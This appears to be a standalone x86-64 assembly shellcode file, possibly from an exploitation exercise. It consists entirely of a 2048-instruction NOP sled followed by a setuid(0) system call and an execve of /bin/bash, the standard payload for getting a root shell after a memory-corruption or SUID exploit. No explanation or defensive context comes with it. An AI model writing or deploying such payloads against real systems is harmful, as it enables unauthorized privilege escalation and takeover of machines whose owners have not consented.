.global _start 
_start:
.intel_syntax noprefix
######   Set NOP before 
.rept 2048
.nop
.endr
######   setuid(0)
        mov rax, 105
        mov rdi, 0
        syscall
######   execve("/bin/bash", 0, 0)
        mov rax, 59
        lea rdi, [binbash]
        mov rsi, 0
        mov rdx, 0
        syscall

binbash:
        .string "/bin/bash"
